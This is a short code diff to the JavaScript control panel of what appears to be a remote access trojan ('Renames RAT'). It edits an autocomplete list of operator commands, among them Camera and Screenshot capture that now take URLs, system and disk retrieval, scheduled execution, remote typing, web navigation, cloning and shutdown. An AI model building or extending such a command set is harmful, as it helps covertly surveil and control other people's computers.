@@ -1,4 +1,4 @@
-// TODO Keyboard shortcuts.
+// TODO Keyboard shortcuts and client cutsom macros
 
 maxie(4); // Default Layout
 $("div.split-pane").splitPane(); //draggable handles
@@ -298,7 +298,8 @@ var wordList = [
  {helper: "Marco();", value: "Marco();", args: false, meta: " Returns Polo if Online"},
  {helper: "Exit();", value: "Exit();", args: false, meta: " End Execution"},
  {helper: 'Update("");', value: "Update();", args: true, meta: " Updates self"},
- {helper: 'Hibernate("");', value: "Hibernate();", args: true, meta: " Hibernate till date"},
+ {helper: 'Hibernate("15-01-2030");', value: "Hibernate();", args: true, meta: " Hibernate till date"},
+ {helper: 'ExecuteAt("14:59");', value: "ExecuteAt();", args: true, meta: " Executes script at specified time."},
  {helper: "Revive();", value: "Revive();", args: false, meta: " End Hibernation  "},
  {helper: 'Notify("");', value: "Notify();", args: true, meta: " Notifies power schedule"},
  {helper: 'Rename("");', value: "Rename();", args: true, meta: " Renames RAT"},
@@ -337,8 +338,8 @@ pause
  {helper: 'Google("Hi, How are you doing?..");', value: "Google();", args: true, meta: " Googles selected Text"},
  {helper: 'Web("https://www.google.com");', value: "Web();", args: true, meta: " Navigates to a specific URL."},
  {helper: 'Type("Hello, My name is Casper..");', value: "Type();", args: true, meta: " Types custom text"},
- {helper: 'Screenshot("");', value: "Screenshot();", args: true, meta: " Takes a Screenshot"},
- {helper: 'Camera("");', value: "Camera();", args: true, meta: " Captures a Photo"},
+ {helper: 'Screenshot("https://www...");', value: "Screenshot();", args: true, meta: " Takes a Screenshot"},
+ {helper: 'Camera("https://www...");', value: "Camera();", args: true, meta: " Captures a Photo"},
  {helper: "Details();", value: "Details();", args: false, meta: " Retrieves System Info"},
  {helper: "Disk();", value: "Disk();", args: false, meta: " Retrieves Disk Info"},
  {helper: 'Tree("C:\\..");', value: "Tree();", args: true, meta: " Retrieves Disk Info"},
@@ -347,12 +348,13 @@ pause
  {helper: 'Zip("");', value: "Zip();", args: true, meta: " Zip a folder"},
  {helper: 'Unzip("");', value: "Unzip();", args: true, meta: " Unzips file"},
  {helper: "Health();", value: "Health();", args: false, meta: " Reports back working conditions"},
- {helper: 'Log("");', value: "Log();", args: true, meta: " Logs every Activity"},
+ {helper: "Log();", value: "Log();", args: false, meta: " Return list of active applications."},
  {helper: "Delay(5000);", value: "Delay();", args: true, meta: " Pause Execution temporarily for 'x' ms"},
  {helper: "Shutdown(3500);", value: "Shutdown();", args: true, meta: " Shutsdown the system after 'x' ms"},
  {helper: 'Clone("Name","https://www...");', value: "Clone();", args: true, meta: " Initiate Clone Operations"},
  {helper: "NClone();", value: "NClone();", args: false, meta: " Stops Cloning op"},
 ];
+
 var staticWordCompleter = {
  getCompletions: function (editor, session, pos, prefix, callback) {
   let line = session.getLine(pos.row);
